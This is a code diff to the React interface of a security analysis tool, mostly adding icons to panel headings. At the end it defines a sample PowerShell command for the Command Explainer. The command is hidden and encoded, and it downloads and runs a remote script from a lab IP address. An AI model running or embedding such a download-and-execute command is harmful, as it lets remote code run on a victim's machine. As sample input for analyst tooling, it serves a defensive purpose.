@@ -3,6 +3,7 @@ import {
   BookOpen,
   Clipboard,
   Database,
+  FileSearch,
   Search,
   Send,
   TerminalSquare,
@@ -278,7 +279,7 @@ function EventIdentifier({
 
       <div className="ba-guide-panel ba-guide-span-2">
         <div className="ba-guide-section-title">
-          <h2>Event description</h2>
+          <h2><BookOpen size={16} className="inline mr-1" />Event description</h2>
           <span>{lookupResult?.found ? eventLabel(lookupResult) : "lookup required"}</span>
         </div>
         {lookupResult ? <EventResult result={lookupResult} setPage={setPage} /> : <EmptyState title="No Event ID selected" body="Enter an Event ID above to view the full BeyondArch local reference entry. Use the Command Explainer for commands and Artifact Intake for mixed text or URLs." />}
@@ -407,7 +408,7 @@ function SplBuilder({ config, setConfig, selected, query, explanation, setPage }
 
       <div className="ba-guide-panel ba-guide-span-2">
         <div className="ba-guide-section-title">
-          <h2>Generated SPL</h2>
+          <h2><Database size={16} className="inline mr-1" />Generated SPL</h2>
           <span>{selected.id}</span>
         </div>
         <code className="ba-guide-code">{query}</code>
@@ -445,13 +446,13 @@ function CommandExplainer({ commandInput, setCommandInput, result, onExplain, se
       </div>
 
       <div className="ba-guide-panel">
-        <h2>Command input</h2>
+                  <h2><TerminalSquare size={16} className="inline mr-1" />Command input</h2>
         <textarea className="ba-guide-command-box" value={commandInput} onChange={(event) => setCommandInput(event.target.value)} placeholder="powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ..." />
         <p className="ba-guide-subtle">Use this for terminal history, process command lines, EDR command-line fields, copied scripts, or suspicious one-liners.</p>
       </div>
 
       <div className="ba-guide-panel">
-        <h2>Rough explanation</h2>
+        <h2><Search size={16} className="inline mr-1" />Rough explanation</h2>
         {local ? (
           <div className="ba-guide-result">
             <section className="ba-guide-result-title"><h3>{local.shell}</h3><p>{local.summary}</p></section>
@@ -471,7 +472,7 @@ function CommandExplainer({ commandInput, setCommandInput, result, onExplain, se
 
       {local ? (
         <div className="ba-guide-panel ba-guide-span-2">
-          <div className="ba-guide-section-title"><h2>Artifacts and pivots</h2><span>text-only analysis</span></div>
+          <div className="ba-guide-section-title"><h2><Database size={16} className="inline mr-1" />Artifacts and pivots</h2><span>text-only analysis</span></div>
           <div className="ba-guide-artifact-grid">
             <ArtifactList title="URLs" items={local.artifacts.urls} target="safe-url-analyzer" setPage={setPage} />
             <ArtifactList title="IPs" items={local.artifacts.ips} target="recon-exposure" setPage={setPage} />
@@ -506,7 +507,7 @@ function PanelBlock({ title, items }) {
 }
 
 function EmptyState({ title, body }) {
-  return <div className="ba-guide-empty"><strong>{title}</strong><p>{body}</p></div>
+  return <div className="ba-guide-empty"><FileSearch size={22} className="text-zinc-500 mb-2" /><strong>{title}</strong><p>{body}</p></div>
 }
 
 const POWER_SHELL_SAMPLE = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="
